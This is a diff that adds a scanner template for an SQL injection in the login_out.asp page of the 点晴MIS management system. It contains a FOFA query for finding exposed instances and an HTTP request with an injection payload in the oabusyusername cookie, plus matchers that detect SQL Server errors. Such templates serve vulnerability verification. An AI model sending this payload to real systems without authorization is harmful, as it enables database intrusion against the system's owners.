@@ -1,0 +1,20 @@
+## id: VEID-2025-1205
+## name: 点晴MIS管理信息系统login_out.asp存在SQL注入
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2025
+## description: 该漏洞出现在点晴MIS系统的 login_out.asp 文件中。系统在处理用户注销或会话相关逻辑时，未对 Cookie 中的 oabusyusername 参数进行有效的过滤或 sanitization（清理），导致攻击者可以通过构造特殊的 Cookie 值来篡改后台SQL查询语句的结构
+## fofa-query:title="点晴MIS管理信息系统"
+## verification: true
+
+
+GET /login_out.asp HTTP/1.1
+Host: {{Hostname}}
+Cookie: oabusyusername=1'+and+@@VERSION>1--
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
+
+#@ condition: and
+#@ matcher: status_code == 500
+#@ matcher: body contains "SQL Server"
+
+
